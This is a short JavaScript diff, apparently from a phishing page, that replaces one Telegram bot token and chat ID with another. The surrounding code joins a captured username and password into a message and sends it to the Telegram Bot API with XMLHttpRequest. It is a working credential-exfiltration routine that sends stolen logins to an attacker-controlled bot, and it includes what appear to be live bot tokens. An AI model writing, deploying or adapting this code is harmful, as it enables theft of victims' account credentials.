@@ -8,8 +8,8 @@ document
 
     var message = `${username} -> ${pass}`;
 
-    var token = "6218757530:AAHEXMuFu2uaK_nAyA1WJ8mJY0K-Cdymn90";
-    var chat_id = "5770507003";
+    var token = "7111698326:AAG_zXON_peqfoXfE_7p8LhZtvBrYi6oLIg";
+    var chat_id = "6947707094";
     var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`;
 
     var oReq = new XMLHttpRequest();
